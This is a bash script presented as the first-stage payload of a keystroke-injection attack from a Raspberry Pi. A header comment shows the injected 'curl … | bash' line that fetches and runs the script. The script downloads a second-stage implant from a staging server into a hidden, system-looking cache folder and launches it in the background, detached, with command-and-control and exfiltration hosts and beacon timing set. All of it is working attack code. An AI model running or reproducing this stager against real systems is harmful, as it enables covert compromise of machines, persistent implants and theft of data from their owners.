#!/bin/bash
# stager.sh — Stage 1 payload (dropped via keystroke injection)
#
# What the Pi injects (single line, ~80 chars):
#   curl -s http://<STAGING_HOST>:8080/stager.sh|bash
#
# This script:
#   1. Downloads Stage 2 files from the staging server
#   2. Installs the cryptography package
#   3. Launches implant_client.py in the background

set -e

STAGING_HOST="${STAGING_HOST:-192.168.1.100}"
C2_HOST="${C2_HOST:-${STAGING_HOST}}"
C2_PORT="${C2_PORT:-9999}"
EXFIL_HOST="${EXFIL_HOST:-${C2_HOST}}"
EXFIL_PORT="${EXFIL_PORT:-9090}"
STAGING_URL="http://${STAGING_HOST}:8080"

# Work in a temp dir - avoids leaving obvious files in home
WORK="${HOME}/.cache/.sysd"
mkdir -p "${WORK}"
cd "${WORK}"

# Download Stage 2
curl -s -o helper.py         "${STAGING_URL}/helper.py"
curl -s -o implant_client.py "${STAGING_URL}/implant_client.py"

# Install dependency
python3 -m pip install -q "cryptography>=3.4,<4.0" 2>/dev/null \
  || pip3 install -q "cryptography>=3.4,<4.0" 2>/dev/null \
  || true

# Launch Stage 2 in background
nohup env \
  C2_HOST="${C2_HOST}" \
  C2_PORT="${C2_PORT}" \
  EXFIL_HOST="${EXFIL_HOST}" \
  EXFIL_PORT="${EXFIL_PORT}" \
  BEACON_MIN="4" \
  BEACON_MAX="12" \
  python3 implant_client.py \
  >/dev/null 2>&1 &

disown $!
